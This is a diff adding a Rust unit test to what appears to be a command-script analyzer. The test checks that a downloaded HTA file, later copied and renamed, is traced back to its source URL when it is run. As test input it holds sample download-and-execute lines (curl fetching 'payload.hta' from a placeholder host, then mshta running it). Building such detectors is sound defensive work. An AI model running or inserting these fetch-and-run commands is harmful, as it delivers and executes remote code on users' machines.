@@ -23015,6 +23015,28 @@ mod copy_multi_source_tests {
     use crate::interp::interpret_line;
 
     #[test]
+    fn copy_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o original.hta https://copy-download.example/payload.hta
+copy original.hta renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://copy-download.example/payload.hta"
+                )
+            }),
+            "copied downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copy_preserves_download_source_for_quoted_paths_with_spaces() {
         let report = crate::analyze(
             br#"curl -o "original payload.hta" https://copy-space-download.example/payload.hta
